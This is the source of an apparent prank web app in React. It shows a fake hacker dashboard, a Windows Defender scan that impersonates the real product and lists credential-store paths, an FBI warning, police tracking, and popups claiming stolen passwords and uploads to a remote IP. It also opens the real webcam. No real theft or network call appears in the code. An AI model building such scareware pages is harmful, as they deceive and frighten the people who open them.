                  background: i === 2 ? "#c42b1c" : "rgba(255,255,255,0.1)",
                  borderRadius: 2,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  color: "#ccc",
                  fontSize: 10,
                  cursor: "default",
                }}
              >
                {sym}
              </div>
            ))}
          </div>
        </div>

        {/* Body */}
        <div style={{ padding: "20px 24px 24px" }}>
          {phase === "scanning" ? (
            <>
              {/* Header */}
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: 14,
                  marginBottom: 20,
                }}
              >
                <div
                  style={{
                    width: 52,
                    height: 52,
                    borderRadius: "50%",
                    background: "rgba(220,30,30,0.15)",
                    border: "2px solid #cc2222",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    fontSize: 24,
                    flexShrink: 0,
                  }}
                >
                  ⚠️
                </div>
                <div>
                  <div
                    style={{
                      color: blink ? "#ff4444" : "#cc2222",
                      fontSize: 16,
                      fontWeight: 700,
                      letterSpacing: 0.5,
                      transition: "color 0.3s",
                    }}
                  >
                    ⚠ THREAT DETECTED — SCANNING IN PROGRESS
                  </div>
                  <div style={{ color: "#aaa", fontSize: 12, marginTop: 3 }}>
                    Windows Defender is scanning your system for malicious
                    software
                  </div>
                </div>
              </div>

              {/* Progress bar */}
              <div style={{ marginBottom: 16 }}>
                <div
                  style={{
                    display: "flex",
                    justifyContent: "space-between",
                    marginBottom: 6,
                  }}
                >
                  <span style={{ color: "#ccc", fontSize: 12 }}>
                    Scan Progress
                  </span>
                  <span
                    style={{ color: "#fff", fontSize: 12, fontWeight: 700 }}
                  >
                    {progress}%
                  </span>
                </div>
                <div
                  style={{
                    height: 8,
                    background: "#0d0d1a",
                    borderRadius: 4,
                    overflow: "hidden",
                    border: "1px solid #333",
                  }}
                >
                  <motion.div
                    animate={{ width: `${progress}%` }}
                    transition={{ duration: 0.3 }}
                    style={{
                      height: "100%",
                      background: "linear-gradient(90deg, #1a6ecc, #3a9bff)",
                      borderRadius: 4,
                    }}
                  />
                </div>
              </div>

              {/* Live counters */}
              <div
                style={{
                  display: "grid",
                  gridTemplateColumns: "1fr 1fr 1fr",
                  gap: 10,
                  marginBottom: 16,
                }}
              >
                {[
                  {
                    label: "Files Scanned",
                    value: filesScanned.toLocaleString(),
                    color: "#7ecfff",
                  },
                  {
                    label: "Threats Found",
                    value: threatCount.toString(),
                    color: threatCount > 0 ? "#ff6666" : "#66ff88",
                  },
                  {
                    label: "Critical",
                    value:
                      threatCount > 1
                        ? Math.max(0, threatCount - 1).toString()
                        : "0",
                    color: threatCount > 1 ? "#ff3333" : "#888",
                  },
                ].map(({ label, value, color }) => (
                  <div
                    key={label}
                    style={{
                      background: "#0f0f1e",
                      border: "1px solid #2a2a3e",
                      borderRadius: 4,
                      padding: "8px 12px",
                      textAlign: "center",
                    }}
                  >
                    <div
                      style={{
                        color,
                        fontSize: 22,
                        fontWeight: 700,
                        fontFamily: "monospace",
                      }}
                    >
                      {value}
                    </div>
                    <div style={{ color: "#888", fontSize: 11 }}>{label}</div>
                  </div>
                ))}
              </div>

              {/* Scrolling files */}
              <div
                style={{
                  background: "#0a0a16",
                  border: "1px solid #1e1e30",
                  borderRadius: 4,
                  padding: "10px 12px",
                  height: 130,
                  overflow: "hidden",
                  marginBottom: 16,
                }}
              >
                <div style={{ color: "#555", fontSize: 10, marginBottom: 6 }}>
                  SCANNING FILES:
                </div>
                {files.map((f, i) => (
                  <div
                    // biome-ignore lint/suspicious/noArrayIndexKey: order matters for animation
                    key={`file-${i}`}
                    style={{
                      color: i === files.length - 1 ? "#7ecfff" : "#4a5568",
                      fontSize: 11,
                      fontFamily: "Consolas, monospace",
                      marginBottom: 3,
                      whiteSpace: "nowrap",
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                    }}
                  >
                    {i === files.length - 1 && (
                      <span style={{ color: "#3a9bff" }}>▶ </span>
                    )}
                    {f}
                  </div>
                ))}
              </div>

              {/* Status bar */}
              <div
                style={{
                  background: "#0d1117",
                  border: "1px solid #2d3748",
                  borderRadius: 4,
                  padding: "10px 14px",
                  textAlign: "center",
                  color: blink ? "#ffcc00" : "#cc9900",
                  fontSize: 12,
                  fontWeight: 700,
                  letterSpacing: 1,
                }}
              >
                SCANNING YOUR SYSTEM... DO NOT TURN OFF YOUR COMPUTER
              </div>
            </>
          ) : (
            <>
              {/* Results header */}
              <div style={{ textAlign: "center", marginBottom: 20 }}>
                <div style={{ fontSize: 40, marginBottom: 8 }}>🚨</div>
                <div
                  style={{
                    color: blink ? "#ff2222" : "#cc0000",
                    fontSize: 20,
                    fontWeight: 800,
                    letterSpacing: 1,
                    textTransform: "uppercase",
                    transition: "color 0.3s",
                  }}
                >
                  ⚠ YOUR COMPUTER IS AT RISK!
                </div>
                <div style={{ color: "#ff8888", fontSize: 13, marginTop: 6 }}>
                  3 critical threats found. Your personal data may be
                  compromised.
                </div>
              </div>

              {/* Threat list */}
              <div style={{ marginBottom: 20 }}>
                {threats.map((t) => (
                  <div
                    key={t.name}
                    style={{
                      background: "#0f0f1e",
                      border: `1px solid ${t.level.includes("CRITICAL") ? "#5a1a1a" : "#4a3a00"}`,
                      borderRadius: 4,
                      padding: "10px 14px",
                      marginBottom: 8,
                    }}
                  >
                    <div
                      style={{
                        display: "flex",
                        justifyContent: "space-between",
                        alignItems: "center",
                        flexWrap: "wrap",
                        gap: 4,
                      }}
                    >
                      <div>
                        <span style={{ fontSize: 12 }}>
                          {t.level.split(" ")[0]}{" "}
                        </span>
                        <span
                          style={{
                            color: t.level.includes("CRITICAL")
                              ? "#ff4444"
                              : "#ffcc00",
                            fontWeight: 700,
                            fontSize: 13,
                          }}
                        >
                          {t.level.replace(/^[^ ]+ /, "")}:
                        </span>
                        <span
                          style={{
                            color: "#e0e0e0",
                            fontWeight: 600,
                            fontSize: 13,
                            marginLeft: 6,
                          }}
                        >
                          {t.name}
                        </span>
                      </div>
                    </div>
                    <div
                      style={{
                        color: "#666",
                        fontSize: 11,
                        fontFamily: "Consolas, monospace",
                        marginTop: 4,
                      }}
                    >
                      {t.path}
                    </div>
                  </div>
                ))}
              </div>

              {/* Action buttons */}
              <div
                style={{
                  display: "grid",
                  gridTemplateColumns: "1fr 1fr",
                  gap: 12,
                }}
              >
                <button
                  type="button"
                  data-ocid="virusscan.confirm_button"
                  onClick={onClose}
                  style={{
                    padding: "12px",
                    background: "#cc2222",
                    border: "none",
                    borderRadius: 4,
                    color: "#fff",
                    fontWeight: 700,
                    fontSize: 13,
                    cursor: "pointer",
                    letterSpacing: 0.5,
                  }}
                >
                  🗑 REMOVE ALL THREATS
                </button>
                <button
                  type="button"
                  data-ocid="virusscan.secondary_button"
                  onClick={onClose}
                  style={{
                    padding: "12px",
                    background: "#1a5fa8",
                    border: "none",
                    borderRadius: 4,
                    color: "#fff",
                    fontWeight: 700,
                    fontSize: 13,
                    cursor: "pointer",
                    letterSpacing: 0.5,
                  }}
                >
                  🛡 ACTIVATE FULL PROTECTION
                </button>
              </div>
            </>
          )}
        </div>
      </motion.div>
    </motion.div>
  );
}

// ─── App ──────────────────────────────────────────────────────────────────────

export default function App() {
  const [showLoader, setShowLoader] = useState(true);
  const [flashMsg, setFlashMsg] = useState<{
    text: string;
    color: "neon" | "red";
  } | null>(null);
  const [showEasterEgg, setShowEasterEgg] = useState(false);
  const [time, setTime] = useState(new Date());
  const [sessionId] = useState(() => randHex(8).replace("0x", "SESS-"));
  const [fakeIp] = useState(() => randIp());
  const flashTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const [paused, setPaused] = useState(false);
  const [showAddMsg, setShowAddMsg] = useState(false);
  const [msgInput, setMsgInput] = useState("");
  const [selectedMsgId, setSelectedMsgId] = useState<string | null>(null);
  const [injectedLines, setInjectedLines] = useState<(TermLine | null)[]>(
    Array(6).fill(null),
  );

  // Hide loader after 6.5s
  useEffect(() => {
    const t = setTimeout(() => {
      setShowLoader(false);
      setTimeout(() => {
        // Step 1: FBI Warning
        setShowFBIWarning(true);
        playBeep();
        setTimeout(() => {
          setShowFBIWarning(false);
          // Step 2: Police Tracking (immediately after FBI)
          setTimeout(() => {
            policeCloseCallbackRef.current = () => {
              policeCloseCallbackRef.current = null;
              // Step 3: Location notification after police tracking closes
              setTimeout(() => {
                addScaryPopupRef.current?.(
                  "Location transmitted",
                  "City: Karachi, PK | Coords: 24.8607° N, 67.0011° E",
                  "top-right",
                  "Maps",
                  "🟦",
                );
              }, 500);
            };
            setShowPoliceTracking(true);
          }, 400);
        }, 4500);
      }, 500);
    }, 6500);
    return () => clearTimeout(t);
  }, []);

  // ── Saved messages (localStorage) ──
  const [savedMessages, setSavedMessages] = useState<SavedMessage[]>(() => {
    try {
      const stored = localStorage.getItem(STORAGE_KEY);
      return stored ? (JSON.parse(stored) as SavedMessage[]) : [];
    } catch {
      return [];
    }
  });

  const persistMessages = (msgs: SavedMessage[]) => {
    setSavedMessages(msgs);
    try {
      localStorage.setItem(STORAGE_KEY, JSON.stringify(msgs));
    } catch {
      // ignore
    }
  };

  const deleteMessage = (id: string) => {
    persistMessages(savedMessages.filter((m) => m.id !== id));
  };

  // On load: re-inject saved messages into panels with staggered delay
  const initialMsgsRef = useRef<SavedMessage[]>(savedMessages);
  useEffect(() => {
    const msgs = initialMsgsRef.current;
    if (msgs.length === 0) return;
    msgs.forEach((msg, i) => {
      setTimeout(
        () => {
          const newLine: TermLine = {
            id: lineIdCounter++,
            text: msg.text,
            type: "custom",
          };
          setInjectedLines(Array(6).fill(newLine));
          setTimeout(() => setInjectedLines(Array(6).fill(null)), 100);
        },
        i * 600 + 7500,
      );
    });
  }, []);

  // Clock
  useEffect(() => {
    const t = setInterval(() => setTime(new Date()), 1000);
    return () => clearInterval(t);
  }, []);

  // Flash messages
  const triggerFlash = useCallback(() => {
    if (paused) return;
    const msg = randItem(FLASH_MESSAGES);
    setFlashMsg(msg);
    if (flashTimeoutRef.current) clearTimeout(flashTimeoutRef.current);
    flashTimeoutRef.current = setTimeout(() => setFlashMsg(null), 2200);
  }, [paused]);

  useEffect(() => {
    const initial = setTimeout(() => {
      triggerFlash();
      const interval = setInterval(triggerFlash, randInt(10000, 16000));
      return () => clearInterval(interval);
    }, 9000);
    return () => clearTimeout(initial);
  }, [triggerFlash]);

  // ESC key easter egg
  useEffect(() => {
    const handler = (e: KeyboardEvent) => {
      if (e.key === "Escape" && !showAddMsg) setShowEasterEgg(true);
    };
    window.addEventListener("keydown", handler);
    return () => window.removeEventListener("keydown", handler);
  }, [showAddMsg]);

  const restart = () => {
    setShowEasterEgg(false);
    setFlashMsg(null);
  };

  const handleAddMessage = () => {
    if (!msgInput.trim()) return;
    const text = msgInput.trim();
    const newLine: TermLine = {
      id: lineIdCounter++,
      text,
      type: "custom",
    };
    // Inject into all panels
    setInjectedLines(Array(6).fill(newLine));
    setTimeout(() => setInjectedLines(Array(6).fill(null)), 100);

    // Save permanently (only if not already a saved message being re-injected)
    if (!selectedMsgId) {
      const newSaved: SavedMessage = {
        id: `msg_${Date.now()}_${Math.random().toString(36).slice(2)}`,
        text,
        createdAt: Date.now(),
      };
      persistMessages([...savedMessages, newSaved]);
    }

    setMsgInput("");
    setSelectedMsgId(null);
    // Close modal and return to panels
    setShowAddMsg(false);
  };

  // ── Scary Hack Effects ──────────────────────────────────────────────────────

  // Camera state
  const [cameraStream, setCameraStream] = useState<MediaStream | null>(null);
  const [showCamera, setShowCamera] = useState(false);
  const [cameraBlocked, setCameraBlocked] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const cameraAttempted = useRef(false);

  // Scary popup notifications
  const [scaryPopups, setScaryPopups] = useState<
    {
      id: number;
      title: string;
      detail: string;
      position: "top-right" | "bottom-right";
      app?: string;
      icon?: string;
    }[]
  >([]);
  const popupIdRef = useRef(0);

  // Screen shake
  const [shaking, setShaking] = useState(false);

  // Red flash
  const [redFlash, setRedFlash] = useState(false);

  // System alert banner
  const [showBanner, setShowBanner] = useState(false);

  // FBI Warning
  const [showFBIWarning, setShowFBIWarning] = useState(false);

  // Virus Scan
  const [showVirusScan, setShowVirusScan] = useState<
    "scanning" | "results" | null
  >(null);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanFiles, setScanFiles] = useState<string[]>([]);
  const [threatCount, setThreatCount] = useState(0);
  const [filesScanned, setFilesScanned] = useState(0);

  // Mic Recording
  const [showMicRecording, setShowMicRecording] = useState(false);
  // Screenshot capture state
  const [screenshotData, setScreenshotData] = useState<string | null>(null);
  const [screenshotPhase, setScreenshotPhase] = useState<
    "capture" | "upload" | null
  >(null);
  const [uploadProgress, setUploadProgress] = useState(0);
  const [uploadBytes, setUploadBytes] = useState(0);
  // Police Tracking Map
  const [showPoliceTracking, setShowPoliceTracking] = useState(false);
  const policeCloseCallbackRef = React.useRef<(() => void) | null>(null);
  const addScaryPopupRef = React.useRef<
    | ((
        title: string,
        detail: string,
        position: "top-right" | "bottom-right",
        app?: string,
        icon?: string,
      ) => void)
    | null
  >(null);

  // Countdown Timer (System Shutdown)
  const [showCountdown, setShowCountdown] = useState(false);

  // Helper: beep sound
  const playBeep = useCallback(() => {
    try {
      const ctx = new AudioContext();
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.frequency.value = 880;
      gain.gain.setValueAtTime(0.3, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.2);
      osc.start();
      osc.stop(ctx.currentTime + 0.2);
    } catch {
      // ignore audio errors
    }
  }, []);

  // Helper: add scary popup
  const addScaryPopup = useCallback(
    (
      title: string,
      detail: string,
      position: "top-right" | "bottom-right",
      app?: string,
      icon?: string,
    ) => {
      const id = ++popupIdRef.current;
      setScaryPopups((prev) => [
        ...prev,
        { id, title, detail, position, app, icon },
      ]);
      playBeep();
      setTimeout(
        () => setScaryPopups((prev) => prev.filter((p) => p.id !== id)),
        4200,
      );
    },
    [playBeep],
  );

  addScaryPopupRef.current = addScaryPopup;

  // Screenshot capture sequence
  const triggerScreenshotCapture = useCallback(async () => {
    try {
      // Simulate screenshot using native canvas
      const canvas = document.createElement("canvas");
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      const ctx2 = canvas.getContext("2d")!;
      ctx2.fillStyle = "#000a04";
      ctx2.fillRect(0, 0, canvas.width, canvas.height);
      ctx2.strokeStyle = "rgba(0,255,136,0.08)";
      ctx2.lineWidth = 1;
      for (let gy = 0; gy < canvas.height; gy += 20) {
        ctx2.beginPath();
        ctx2.moveTo(0, gy);
        ctx2.lineTo(canvas.width, gy);
        ctx2.stroke();
      }
      ctx2.fillStyle = "#00ff88";
      ctx2.font = "12px monospace";
      [
        "[SYSTEM ACCESS GRANTED]",
        "$ nmap -sS 192.168.1.0/24",
        "Scanning...",
        "Host: 192.168.1.5 OPEN",
        "HOST COMPROMISED",
        "PASSWORD EXTRACTED: ****",
        "UPLOADING DATA...",
      ].forEach((line, i) => {
        ctx2.fillText(line, 20, 40 + i * 22);
      });
      ctx2.fillStyle = "#ff3333";
      ctx2.font = "bold 16px monospace";
      ctx2.fillText(
        "⚠ CYBER ATTACK IN PROGRESS",
        canvas.width / 2 - 160,
        canvas.height / 2,
      );
      const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
      setScreenshotData(dataUrl);
      setScreenshotPhase("capture");
      setUploadProgress(0);
      setUploadBytes(0);
      playBeep();
      setTimeout(() => {
        setScreenshotPhase("upload");
        const totalBytes = 1258291; // ~1.2MB
        const duration = 3000;
        const steps = 60;
        let step = 0;
        const interval = setInterval(() => {
          step++;
          const progress = Math.min(100, Math.round((step / steps) * 100));
          const bytes = Math.round((progress / 100) * totalBytes);
          setUploadProgress(progress);
          setUploadBytes(bytes);
          if (step >= steps) {
            clearInterval(interval);
            setTimeout(() => {
              setScreenshotData(null);
              setScreenshotPhase(null);
            }, 1500);
          }
        }, duration / steps);
      }, 2500);
    } catch {
      // fallback: just show normal popup
      addScaryPopup(
        "📸 SCREENSHOT CAPTURED",
        "Uploaded to remote server 185.220.101.47",
        "top-right",
      );
    }
  }, [playBeep, addScaryPopup]);

  // Camera effect (once, after ~12s)
  useEffect(() => {
    if (showLoader) return;
    if (cameraAttempted.current) return;
    cameraAttempted.current = true;
    const t = setTimeout(async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: false,
        });
        setCameraStream(stream);
        setShowCamera(true);
        // Auto-stop after 15s
        setTimeout(() => {
          for (const track of stream.getTracks()) track.stop();
          setShowCamera(false);
          setCameraStream(null);
        }, 15000);
      } catch {
        setCameraBlocked(true);
        setTimeout(() => setCameraBlocked(false), 3000);
      }
    }, 12000);
    return () => clearTimeout(t);
  }, [showLoader]);

  // Attach camera stream to video element
  useEffect(() => {
    if (videoRef.current && cameraStream) {
      videoRef.current.srcObject = cameraStream;
    }
  }, [cameraStream]);

  // Cleanup camera on unmount
  useEffect(() => {
    return () => {
      if (cameraStream) {
        for (const t of cameraStream.getTracks()) t.stop();
      }
    };
  }, [cameraStream]);

  // Scary popup random interval
  const SCARY_ALERTS = [
    {
      title: "Screenshot saved",
      detail: "Uploaded to remote server 185.220.101.47",
      app: "Security Alert",
      icon: "🟥",
    },
    {
      title: "Location acquired",
      detail: "City: Karachi, PK | Coords: 24.8607° N, 67.0011° E",
      app: "Maps",
      icon: "🟦",
    },
    {
      title: "Microphone accessed",
      detail: "Audio stream active — recording in background",
      app: "System",
      icon: "🟪",
    },
    {
      title: "Clipboard contents copied",
      detail: "Contents copied to remote attacker buffer",
      app: "Clipboard",
      icon: "🟨",
    },
    {
      title: "Passwords extracted",
      detail: "12 credentials found in browser keychain",
      app: "Credential Manager",
      icon: "🔴",
    },
    {
      title: "Contacts uploaded",
      detail: "847 contacts sent to C2 server",
      app: "Contacts",
      icon: "🟢",
    },
    {
      title: "Browser history exfiltrated",
      detail: "Last 30 days — 1,247 entries exported",
      app: "Microsoft Edge",
      icon: "🔵",
    },
  ];

  useEffect(() => {
    if (showLoader) return;
    let timeoutId: ReturnType<typeof setTimeout>;
    const schedule = () => {
      const delay = randInt(8000, 20000);
      timeoutId = setTimeout(() => {
        const alert = randItem(SCARY_ALERTS);
        if (alert.title === "📸 SCREENSHOT CAPTURED") {
          triggerScreenshotCapture();
        } else {
          const position = Math.random() > 0.5 ? "top-right" : "bottom-right";
          addScaryPopup(
            alert.title,
            alert.detail,
            position as "top-right" | "bottom-right",
            alert.app,
            alert.icon,
          );
        }
        schedule();
      }, delay);
    };
    schedule();
    return () => clearTimeout(timeoutId);
  }, [showLoader, addScaryPopup, triggerScreenshotCapture]);

  // Screen shake random interval
  useEffect(() => {
    if (showLoader) return;
    let timeoutId: ReturnType<typeof setTimeout>;
    const schedule = () => {
      const delay = randInt(15000, 30000);
      timeoutId = setTimeout(() => {
        setShaking(true);
        setTimeout(() => setShaking(false), 400);
        schedule();
      }, delay);
    };
    schedule();
    return () => clearTimeout(timeoutId);
  }, [showLoader]);

  // Red flash random interval
  useEffect(() => {
    if (showLoader) return;
    let timeoutId: ReturnType<typeof setTimeout>;
    const schedule = () => {
      const delay = randInt(20000, 40000);
      timeoutId = setTimeout(() => {
        setRedFlash(true);
        playBeep();
        setTimeout(() => setRedFlash(false), 350);
        schedule();
      }, delay);
    };
    schedule();
    return () => clearTimeout(timeoutId);
  }, [showLoader, playBeep]);

  // System alert banner random interval
  useEffect(() => {
    if (showLoader) return;
    let timeoutId: ReturnType<typeof setTimeout>;
    const schedule = () => {
      const delay = randInt(25000, 50000);
      timeoutId = setTimeout(() => {
        setShowBanner(true);
        playBeep();
        setTimeout(() => setShowBanner(false), 3200);
        schedule();
      }, delay);
    };
    schedule();
    return () => clearTimeout(timeoutId);
  }, [showLoader, playBeep]);

  // FBI Warning random interval (first appearance handled by loader effect)
  useEffect(() => {
    if (showLoader) return;
    let timeoutId: ReturnType<typeof setTimeout>;
    const schedule = () => {
      const delay = randInt(180000, 360000);
      timeoutId = setTimeout(() => {
        setShowFBIWarning(true);
        playBeep();
        setTimeout(() => setShowFBIWarning(false), 4500);
        schedule();
      }, delay);
    };
    schedule();
    return () => clearTimeout(timeoutId);
  }, [showLoader, playBeep]);

  // Mic Recording random interval
  useEffect(() => {
    if (showLoader) return;
    let timeoutId: ReturnType<typeof setTimeout>;
    const schedule = () => {
      const delay = randInt(30000, 60000);
      timeoutId = setTimeout(() => {
        const duration = randInt(8000, 12000);
        setShowMicRecording(true);
        setTimeout(() => setShowMicRecording(false), duration);
        schedule();
      }, delay);
    };
    // First appearance after 20-35s
    const firstDelay = randInt(20000, 35000);
    timeoutId = setTimeout(() => {
      const duration = randInt(8000, 12000);
      setShowMicRecording(true);
      setTimeout(() => setShowMicRecording(false), duration);
      schedule();
    }, firstDelay);
    return () => clearTimeout(timeoutId);
  }, [showLoader]);

  // Virus Scan trigger
  useEffect(() => {
    if (showLoader) return;
    let outerTimeout: ReturnType<typeof setTimeout>;
    const randInt = (min: number, max: number) =>
      Math.floor(Math.random() * (max - min + 1)) + min;

    const runScan = () => {
      // Beep on start
      try {
        const ctx = new AudioContext();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.frequency.value = 660;
        gain.gain.setValueAtTime(0.3, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.6);
        osc.start();
        osc.stop(ctx.currentTime + 0.6);
      } catch (_) {
        /* ignore */
      }

      setScanProgress(0);
      setScanFiles([]);
      setThreatCount(0);
      setFilesScanned(0);
      setShowVirusScan("scanning");

      const fakePaths = [
        "C:\\Users\\Admin\\Documents\\passwords.txt",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
        "C:\\Users\\Admin\\Desktop\\bank_details.xlsx",
        "C:\\Windows\\Temp\\svchost32.exe",
        "C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Wallet",
        "C:\\Program Files\\Common Files\\System\\Ole DB",
        "C:\\Users\\Admin\\Documents\\private_keys.pem",
        "C:\\Windows\\System32\\lsass.exe",
        "C:\\Users\\Admin\\AppData\\Local\\Temp\\~DF3421.tmp",
        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs",
        "C:\\Users\\Admin\\Downloads\\setup_v2.3.exe",
        "C:\\Windows\\SysWOW64\\ntdll.dll",
        "C:\\Users\\Admin\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Users\\Admin\\Documents\\credit_cards.docx",
        "C:\\Windows\\Temp\\keylogger_data.dat",
        "C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Credentials",
        "C:\\Program Files (x86)\\Common Files\\InstallShield",
        "C:\\Users\\Admin\\Desktop\\recovery_codes.txt",
      ];

      let pathIdx = 0;
      let prog = 0;
      let threats = 0;
      let scanned = 0;
      const scanInterval = setInterval(() => {
        prog = Math.min(100, prog + 100 / 50);
        scanned += Math.floor(Math.random() * 60) + 20;
        if (pathIdx < fakePaths.length) {
          setScanFiles((prev) => {
            const next = [...prev, fakePaths[pathIdx]];
            return next.slice(-8);
          });
          pathIdx++;
        }
        if (prog > 20 && prog < 85 && Math.random() < 0.15) {
          threats = Math.min(4, threats + 1);
          setThreatCount(threats);
        }
        setScanProgress(Math.round(prog));
        setFilesScanned(scanned);
        if (prog >= 100) {
          clearInterval(scanInterval);
          setThreatCount(3);
          setTimeout(() => {
            setShowVirusScan("results");
          }, 800);
        }
      }, 300);

      // Results auto-close after 8s
      const closeTimer = setTimeout(
        () => {
          setShowVirusScan(null);
          setScanFiles([]);
          setScanProgress(0);
          // Schedule next
          const nextDelay = randInt(4 * 60000, 7 * 60000);
          outerTimeout = setTimeout(runScan, nextDelay);
        },
        15000 + 8000 + 1000,
      );

      return () => {
        clearInterval(scanInterval);
        clearTimeout(closeTimer);
      };
    };

    const firstDelay = randInt(45000, 90000);
    outerTimeout = setTimeout(runScan, firstDelay);
    return () => clearTimeout(outerTimeout);
  }, [showLoader]);

  // Police Tracking Map trigger
  useEffect(() => {
    if (showLoader) return;
    let timeoutId: ReturnType<typeof setTimeout>;
    const schedule = () => {
      const delay = randInt(120000, 180000);
      timeoutId = setTimeout(() => {
        setShowPoliceTracking(true);
        schedule();
      }, delay);
    };
    const firstDelay = randInt(120000, 180000);
    timeoutId = setTimeout(() => {
      setShowPoliceTracking(true);
      schedule();
    }, firstDelay);
    return () => clearTimeout(timeoutId);
  }, [showLoader]);

  // Countdown Timer trigger
  useEffect(() => {
    if (showLoader) return;
    let timeoutId: ReturnType<typeof setTimeout>;
    const schedule = () => {
      const delay = randInt(360000, 600000);
      timeoutId = setTimeout(() => {
        setShowCountdown(true);
        schedule();
      }, delay);
    };
    const firstDelay = randInt(90000, 120000);
    timeoutId = setTimeout(() => {
      setShowCountdown(true);
      schedule();
    }, firstDelay);
    return () => clearTimeout(timeoutId);
  }, [showLoader]);

  const timeStr = time.toTimeString().slice(0, 8);
  const dateStr = time.toLocaleDateString("en-US", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
  });

  return (
    <div
      className={`relative${shaking ? " screen-shake" : ""}`}
      style={{
        width: "100vw",
        height: "100vh",
        overflow: "hidden",
        background: "oklch(0.055 0.01 145)",
        fontFamily: "'JetBrains Mono', 'Courier New', monospace",
        display: "flex",
        flexDirection: "column",
      }}
    >
      {/* ── Hacker Loader ── */}
      <AnimatePresence>{showLoader && <HackerLoader />}</AnimatePresence>

      {/* ── Top Nav ── */}
      <header
        data-ocid="nav.panel"
        style={{
          height: "36px",
          flexShrink: 0,
          borderBottom: "1px solid oklch(0.85 0.22 145 / 0.5)",
          background: "oklch(0.05 0.008 145)",
          display: "flex",
          alignItems: "center",
          paddingInline: "12px",
          gap: "12px",
          boxShadow: "0 0 20px oklch(0.85 0.22 145 / 0.15)",
        }}
      >
        <span
          className="neon-text font-bold"
          style={{ fontSize: "0.75rem", letterSpacing: "0.2em" }}
        >
          CYBER_CORE
        </span>
        <span
          style={{ color: "oklch(0.85 0.22 145 / 0.3)", fontSize: "0.7rem" }}
        >
          |
        </span>

        {["Terminal", "Network", "Systems", "Logs"].map((label) => (
          <button
            key={label}
            type="button"
            data-ocid={`nav.${label.toLowerCase()}.link`}
            style={{
              background: "none",
              border: "none",
              color: "oklch(0.70 0.12 145)",
              fontSize: "0.65rem",
              letterSpacing: "0.1em",
              cursor: "pointer",
              textTransform: "uppercase",
              padding: "2px 4px",
            }}
          >
            {label}
          </button>
        ))}

        <div style={{ flex: 1 }} />

        {/* Pause / Play Button */}
        <button
          type="button"
          data-ocid="controls.pause_button"
          onClick={() => setPaused((p) => !p)}
          title={paused ? "Terminal chalao" : "Terminal rokein"}
          style={{
            padding: "2px 10px",
            border: `1px solid ${
              paused
                ? "oklch(0.62 0.22 25 / 0.8)"
                : "oklch(0.85 0.22 145 / 0.7)"
            }`,
            background: "none",
            color: paused ? "oklch(0.62 0.22 25)" : "oklch(0.85 0.22 145)",
            fontSize: "0.6rem",
            letterSpacing: "0.15em",
            cursor: "pointer",
            textTransform: "uppercase",
            transition: "all 0.2s",
            boxShadow: paused
              ? "0 0 6px oklch(0.62 0.22 25 / 0.4)"
              : "0 0 6px oklch(0.85 0.22 145 / 0.3)",
          }}
        >
          {paused ? "▶ RESUME" : "⏸ PAUSE"}
        </button>

        {/* Add Message Button */}
        <button
          type="button"
          data-ocid="controls.add_msg_button"
          onClick={() => setShowAddMsg(true)}
          title="Apna message add karein"
          style={{
            padding: "2px 10px",
            border: "1px solid oklch(0.70 0.18 290 / 0.8)",
            background: "none",
            color: "oklch(0.70 0.18 290)",
            fontSize: "0.6rem",
            letterSpacing: "0.15em",
            cursor: "pointer",
            textTransform: "uppercase",
            boxShadow: "0 0 6px oklch(0.70 0.18 290 / 0.3)",
            position: "relative",
          }}
        >
          + ADD MSG
          {savedMessages.length > 0 && (
            <span
              style={{
                position: "absolute",
                top: "-6px",
                right: "-6px",
                background: "oklch(0.70 0.18 290)",
                color: "oklch(0.08 0.01 290)",
                borderRadius: "50%",
                width: "14px",
                height: "14px",
                fontSize: "0.5rem",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                fontWeight: "bold",
              }}
            >
              {savedMessages.length}
            </span>
          )}
        </button>

        <span
          style={{
            padding: "2px 8px",
            border: "1px solid oklch(0.85 0.22 145 / 0.7)",
            color: "oklch(0.85 0.22 145)",
            fontSize: "0.6rem",
            letterSpacing: "0.15em",
            textShadow: "0 0 6px oklch(0.85 0.22 145 / 0.8)",
            boxShadow: "0 0 6px oklch(0.85 0.22 145 / 0.3)",
          }}
        >
          HACK.MODE
        </span>
        <span
          className="blink-cursor"
          style={{
            padding: "2px 8px",
            border: paused
              ? "1px solid oklch(0.56 0.03 145 / 0.5)"
              : "1px solid oklch(0.62 0.22 25 / 0.8)",
            color: paused ? "oklch(0.56 0.03 145)" : "oklch(0.62 0.22 25)",
            fontSize: "0.6rem",
            letterSpacing: "0.15em",
            textShadow: paused ? "none" : "0 0 6px oklch(0.62 0.22 25 / 0.8)",
          }}
        >
          {paused ? "PAUSED" : "ACTIVE"}
        </span>
        <span
          style={{
            color: "oklch(0.56 0.03 145)",
            fontSize: "0.6rem",
            letterSpacing: "0.08em",
          }}
        >
          {timeStr}
        </span>
      </header>

      {/* ── 3×2 Panel Grid ── */}
      <main
        data-ocid="terminal.panel"
        style={{
          flex: 1,
          display: "grid",
          gridTemplateColumns: "repeat(3, 1fr)",
          gridTemplateRows: "repeat(2, 1fr)",
          gap: "4px",
          padding: "4px",
          overflow: "hidden",
